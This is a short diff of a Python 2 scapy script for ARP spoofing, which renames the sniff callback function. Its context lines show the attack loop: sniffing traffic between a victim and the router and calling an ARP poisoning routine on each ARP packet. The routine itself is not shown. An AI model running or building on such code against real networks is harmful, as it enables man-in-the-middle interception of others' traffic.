@@ -49,7 +49,7 @@ print "[*] ARP Spoofing Start"
 print "--------------------------------------------------------"
 
 # Sniff function which deal with packet
-def arp_monitor_callback(pkt):
+def packet_deal_with(pkt):
 	# if ARP packet is sent, Get that packet and Send Fake packet
 	if pkt.haslayer(ARP) == 1:
 		arp_poison(victim_IP, router_IP, victim_MAC, router_MAC)
@@ -88,7 +88,7 @@ def arp_monitor_callback(pkt):
 while True:
 	# Until KeyboardInterrupt is occured, Sniff the packet
 	try:
-		sniff(prn=arp_monitor_callback, filter="host "+victim_IP+" or host "+router_IP, count=1)
+		sniff(prn=packet_deal_with, filter="host "+victim_IP+" or host "+router_IP, count=1)
 	# If KeyboardInterrupt is occured, Stop to sniffing and Restore the arp table
 	except KeyboardInterrupt as err:	
 		print "--------------------------------------------------------"
